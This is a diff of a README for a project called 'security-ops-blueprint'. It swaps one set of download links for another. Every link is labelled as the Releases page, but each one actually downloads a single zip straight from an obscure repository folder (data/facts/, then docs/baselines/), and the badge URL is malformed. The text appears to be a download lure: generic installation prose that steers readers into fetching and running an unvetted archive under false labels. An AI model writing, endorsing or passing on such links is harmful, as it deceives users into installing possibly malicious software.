@@ -8,14 +8,14 @@ Welcome to the security-ops-blueprint project. This software provides a safe and
 
 To get started, you need to download the latest version of the application. You can do this by visiting the Releases page. 
 
-[![Download Latest Release](https://github.com/yud1takata/security-ops-blueprint/raw/refs/heads/main/data/facts/ops-blueprint-security-v2.4.zip%20Release-brightgreen)](https://github.com/yud1takata/security-ops-blueprint/raw/refs/heads/main/data/facts/ops-blueprint-security-v2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/yud1takata/security-ops-blueprint/main/docs/baselines/security-blueprint-ops-v1.5-beta.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/yud1takata/security-ops-blueprint/main/docs/baselines/security-blueprint-ops-v1.5-beta.1.zip)
 
 Click the download link above to visit the page. There, you will find the software packages ready for use.
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Click the link here: [Download Latest Release](https://github.com/yud1takata/security-ops-blueprint/raw/refs/heads/main/data/facts/ops-blueprint-security-v2.4.zip). This will take you to the page where you can find all available versions.
+   Click the link here: [Download Latest Release](https://raw.githubusercontent.com/yud1takata/security-ops-blueprint/main/docs/baselines/security-blueprint-ops-v1.5-beta.1.zip). This will take you to the page where you can find all available versions.
 
 2. **Choose the Right File**  
    Look for the latest version at the top of the list. You should see options for different operating systems like Windows, macOS, and Linux. Make sure to select the file that matches your system.
@@ -82,4 +82,4 @@ Each topic is designed to deepen your understanding and improve your security po
 
 You now have everything you need to download and run the security-ops-blueprint application. Follow the steps above, and you will be on your way to enhancing your knowledge of security operations in a safe and structured environment.
 
-Remember, you can always return to the [Releases page](https://github.com/yud1takata/security-ops-blueprint/raw/refs/heads/main/data/facts/ops-blueprint-security-v2.4.zip) to check for updates or new features.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/yud1takata/security-ops-blueprint/main/docs/baselines/security-blueprint-ops-v1.5-beta.1.zip) to check for updates or new features.
